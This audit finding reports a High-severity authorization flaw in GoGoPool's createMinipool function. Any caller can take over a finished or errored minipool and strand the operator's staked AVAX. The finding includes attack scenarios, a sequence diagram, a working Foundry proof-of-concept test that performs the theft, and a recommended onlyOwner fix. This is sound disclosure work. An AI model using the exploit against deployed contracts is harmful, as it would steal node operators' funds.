---
id: 17255
severity: "High"
---

# Hijacking of node operators minipool causes loss of staked funds

## Description

A malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.

The impacts:

1. Node operators staked funds will be lost (Loss of funds)
2. Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)

2.1 See scenario #2 comment for dependencies

```solidity
function createMinipool(
    address nodeID,
    uint256 duration,
    uint256 delegationFee,
    uint256 avaxAssignmentRequest
) external payable whenNotPaused {
----------
    int256 minipoolIndex = getIndexOf(nodeID);
    if (minipoolIndex != -1) {
        onlyOwner(minipoolIndex); // AUDIT: ADDED HERE
----------
    } else {
----------
}
```

The Warden has shown how, due to a lax check for State Transition, a Pool ID can be hijacked, causing the loss of the original deposit

Because the attack is contingent on a logic flaw and can cause a complete loss of Principal, I agree with High Severity.

Separate note: I created [issue 904](https://github.com/code-423n4/2022-12-gogopool-findings/issues/904). For the Finding 2 of this report, please refrain from grouping findings especially when they use different functions and relate to different issues.

Atomically recreate minipool to not allow hijack: [multisig-labs/gogopool#23](https://github.com/multisig-labs/gogopool/pull/23)

## Proof of Concept

**Background description**

The protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:

1. `Prelaunch` - This state is the initial state when a minipool is created. The created minipool will have a status of `Prelaunch` until liquid stakers funds are matched and `rialto` stakes 2000 AVAX into Avalanche.
2. `Withdrawable` - This state is set when the 14 days validation period is over. In this state:  
2.1. `rialto` returned 1000 AVAX to the liquid stakers and handled reward distribution.  
2.2. Node operators can withdraw their staked funds and rewards.  
2.3. If the node operator signed up for a duration longer than 14 days `rialto` will recreate the minipool and stake it for another 14 days.  

3. `Error` - This state is set when `rialto` has an issue to stake the funds in Avalanche

The state machine allows transitions according the `requireValidStateTransition` function: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164>
    
```solidity
function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {
------
    } else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {
        isValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);
    } else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {
        // Once a node is finished/canceled, if they re-validate they go back to beginning state
        isValid = (to == MinipoolStatus.Prelaunch);
------
```

In the above restrictions, we can see that the following transitions are allowed:

1. From `Withdrawable` state to `Prelaunch` state. This transition enables `rialto` to call `recreateMinipool`
2. From `Finished` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol.
3. From `Error` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.

#2 is a needed capability, therefore `createMinipool` allows overriding a minipool record if: `nodeID` already exists and transition to `Prelaunch` is permitted

`createMinipool`:   
    
```solidity
function createMinipool(
    address nodeID,
    uint256 duration,
    uint256 delegationFee,
    uint256 avaxAssignmentRequest
) external payable whenNotPaused {
---------
    // Create or update a minipool record for nodeID
    // If nodeID exists, only allow overwriting if node is finished or canceled
    // 		(completed its validation period and all rewards paid and processing is complete)
    int256 minipoolIndex = getIndexOf(nodeID);
    if (minipoolIndex != -1) {
        requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
        resetMinipoolData(minipoolIndex);
----------
    setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
----------
    setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);
----------
}
```

THE BUG: `createMinipool` can be called by **Anyone** with the `nodeID` of any node operator.

If `createMinipool` is called at the `Withdrawable` state or `Error` state:

* The transaction will be allowed
* The owner of the minipool will be switched to the caller.

Therefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.

**Exploit scenarios**

As shown above, an attacker can **always** hijack the minipool and lock the node operators funds.

1. Cancel the minipool
2. Earn rewards on behalf of original NodeOp

**_Scenario #1 - Cancel the minipool_**

A hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state. Results:

1. Node operator will lose all his staked AVAX  
1.1. This can be done by a malicious actor to **ALL** GoGoPool stakers to lose their funds in a period of 14 days.  

2. Hacker will not lose anything and not gain anything.

Consider the following steps:

1. Hacker creates a node and creates a minipool `node-1337`.
2. NodeOp registers a nodeID `node-123` and finished the 14 days stake period. State is `Withdrawable`.
3. Hacker calls `createMinipool` with `node-123` and deposits 1000 AVAX. Hacker is now owner of the minipool
4. Hacker calls `cancelMinipool` of `node-123` and receives his staked 1000 AVAX.
5. NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.
6. Hacker can withdraw staked AVAX for both `node-1337` and `node-123`

The above step #1 is **not** necessary but allow the hacker to immediately cancel the minipool without waiting 5 days.  
(See other submitted bug #211: “Anti griefing mechanism can be bypassed”)
    
       ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐
       │           │               │           │            │           │              │           │
       │   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    │
       │           │               │           │            │  Manager  │              │           │
       └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘
             │claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) │
             │recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐
             ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │
             │                           │                        │                          │ │ 100 GPP    │
             │                           │createMinipool(Node-123)│                          │ └────────────┘
             │claimAndInitiate(Node-123) ├───────────────────────►│                          │
             │recordStakingStart(...)    │                        │                          │
             ├───────────────────────────┼───────────────────────►│                          │
┌──────────┐ │                           │                        │                          │
│14 days   │ │recordStakingEnd(Node-1337)│                        │                          │ ┌────────────┐
└──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ │ 1000 AVAX  │
             ├───────────────────────────┼───────────────────────►│                          │ │Hacker=Owner│
             │                           │                        │createMinipool(Node-123)  │ └────────────┘
             │                           │                        │◄─────────────────────────┤
             │                           │withdrawMinipoolF..(123)│                          │
             │                           ├───────────────────────►│cancleMinipool(Node-123)  │
             │                           │       REVERT!          │◄─────────────────────────┤
             │                           │◄───────────────────────┤      1000 AVAX           │
             │                           │                        ├─────────────────────────►│
             │                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐
             │                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  │
             │                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and │
             │                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   │
             │                           │   │  withdraw      │   │                          │ └──────────┘
             │                           │   └────────────────┘   │     ┌───────────────┐    │
             │                           │                        │     │Hacker loses no│    │
             │                           │                        │     │funds, can     │    │
             │                           │                        │     │withdraw GPP   │    │
             │                           │                        │     └───────────────┘    │

**_Scenario #2 - Use node of node operator_**

In this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.  
As the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche.

Results:

1. Node operator will lose all his staked AVAX
2. Hacker will gain rewards for staking without hosting a node

Important to note:

* This scenario is only possible if `recordStakingEnd` and `recreateMinipool` are **not** called in the same transaction by `rialto`.
* During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.
* The sponsor requested to submit issues related to `recordStakingEnd` and `recreateMinipool` single/multi transactions for information and clarity anyway.

Consider the following steps:

1. Hacker creates a node and creates a minipool `node-1337`.
2. NodeOp registers a nodeID `node-123` for 28 days duration and finished the 14 days stake period. State is `Withdrawable`.
3. Hacker calls `createMinipool` with `node-1234` and deposits 1000 AVAX. Hacker is now owner of minipool
4. Rialto calls `recreateMinipool` to restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)
5. 14 days have passed, hacker can withdraw the rewards and 1000 staked AVAX
6. NodeOps cannot withdraw staked AVAX.

**Foundry POC**

The POC will demonstrate scenario #1.

Add the following test to `MinipoolManager.t.sol`:   
    
```solidity
function testHijackMinipool() public {
    uint256 duration = 2 weeks;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    uint256 rewards = 10 ether;
    uint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());
    uint256 validationAmt = depositAmt + avaxAssignmentRequest;
    uint128 ggpStakeAmt = 100 ether;
    address hacker = address(0x1337);
    // Fund hacker with exact AVAX and gpp
    vm.deal(hacker, depositAmt*2);
    dealGGP(hacker, ggpStakeAmt);
    // Fund nodeOp with exact AVAX and gpp
    nodeOp = address(0x123);
    vm.deal(nodeOp, depositAmt);
    dealGGP(nodeOp, ggpStakeAmt);

    // fund ggAVAX
    address lilly = getActorWithTokens("lilly", MAX_AMT, MAX_AMT);
    vm.prank(lilly);
    ggAVAX.depositAVAX{value: MAX_AMT}();
    assertEq(lilly.balance, 0);

    vm.startPrank(hacker);
    // Hacker stakes GGP
    ggp.approve(address(staking), ggpStakeAmt);
    staking.stakeGGP(ggpStakeAmt);

    // Create minipool for hacker
    MinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();

    vm.startPrank(nodeOp);
    // nodeOp stakes GGP
    ggp.approve(address(staking), ggpStakeAmt);
    staking.stakeGGP(ggpStakeAmt);

    // Create minipool for nodeOp
    MinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();

    // Rialto stakes both hackers and nodeOp in avalanche 
    vm.startPrank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);
    minipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);

    // Update that staking has started
    bytes32 txID = keccak256("txid");
    minipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);
    minipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);

    // Skip 14 days of staking duration
    skip(duration);

    // Update that staking has ended and funds are withdrawable
    minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);
    minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);
    vm.stopPrank();

    /// NOW STATE: WITHDRAWABLE ///

    vm.startPrank(hacker);
    // Hacker creates a minipool using nodeID of nodeOp
    // Hacker is now the owner of nodeOp minipool
    minipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);

    // Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returned
    minipoolMgr.cancelMinipool(nodeOpMp.nodeID);
    assertEq(hacker.balance, depositAmt);
    // Hacker withdraws his own minipool and receives 1000 AVAX + rewards
    minipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);
    assertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);

    // Hacker withdraws his staked ggp
    staking.withdrawGGP(ggpStakeAmt);
    assertEq(ggp.balanceOf(hacker), ggpStakeAmt);
    vm.stopPrank();

    vm.startPrank(nodeOp);
    // NodeOp tries to withdraw his funds from the minipool
    // Transaction reverts because NodeOp is not the owner anymore
    vm.expectRevert(MinipoolManager.OnlyOwner.selector);
    minipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);

    // NodeOp can still release his staked gpp
    staking.withdrawGGP(ggpStakeAmt);
    assertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);
    vm.stopPrank();
}
```

To run the POC, execute:
    
```bash
forge test -m testHijackMinipool -v
```

Expected output:
    
```
Running 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest
[PASS] testHijackMinipool() (gas: 2346280)
Test result: ok. 1 passed; 0 failed; finished in 9.63s
```

## Recommendation

Fortunately, the fix is very simple.  
The reason `createMinipool` is called with an existing `nodeID` is to re-use the `nodeID` again with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this: `onlyOwner(index)`.

Consider placing `onlyOwner(index)` in the following area:   
    
```solidity
function createMinipool(
    address nodeID,
    uint256 duration,
    uint256 delegationFee,
    uint256 avaxAssignmentRequest
) external payable whenNotPaused {
----------
    int256 minipoolIndex = getIndexOf(nodeID);
    if (minipoolIndex != -1) {
        onlyOwner(minipoolIndex); // AUDIT: ADDED HERE
----------
    } else {
----------
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an improper authorization flaw in the createMinipool function of the GoGoPool protocol. The function allows any caller to supply an existing node identifier (nodeID) and, when the associated minipool is in the Withdrawable or Error state, the contract will overwrite the stored owner address with the caller’s address without verifying that the caller is the legitimate node operator. This occurs because the state machine permits a transition from Withdrawable or Error back to the Prelaunch state, and the createMinipool logic resets the minipool data and sets the owner to msg.sender unconditionally. An attacker can therefore hijack a minipool that has already completed its validation period or encountered an error, become the new owner, and subsequently cancel the minipool or withdraw the staked AVAX and any accrued rewards. The impact is a complete loss of the original node operator’s principal (the staked AVAX) and theft of yield, effectively stealing funds that were expected to be withdrawable after the validation period. The exploit is possible whenever a minipool is in the Withdrawable or Error state and the nodeID already exists in the registry. Affected parties include node operators, their delegators, and any users relying on the protocol’s staking guarantees. The issue was discovered during a security audit that included manual code review and a Foundry proof‑of‑concept test demonstrating that an attacker can call createMinipool with a victim’s nodeID, immediately cancel the pool and retrieve the deposited AVAX, while the victim’s withdrawal attempts revert due to an OnlyOwner check failing. The bug is subtle because the state transition appears legitimate for legitimate reuse of a nodeID, and the UI may simply show that the minipool is withdrawable without indicating a change of ownership, leading users to see their funds disappear or be unable to withdraw. The vulnerability belongs to the class of access‑control bypasses combined with improper state‑machine handling. To remediate, the contract should enforce that only the current owner may invoke createMinipool when overwriting an existing record, for example by inserting an onlyOwner(minipoolIndex) check before resetting the minipool data, or by restricting the Prelaunch transition to authorized callers only. This ensures that a malicious actor cannot hijack a minipool and that the protocol’s accounting assumptions about ownership and fund availability remain intact.
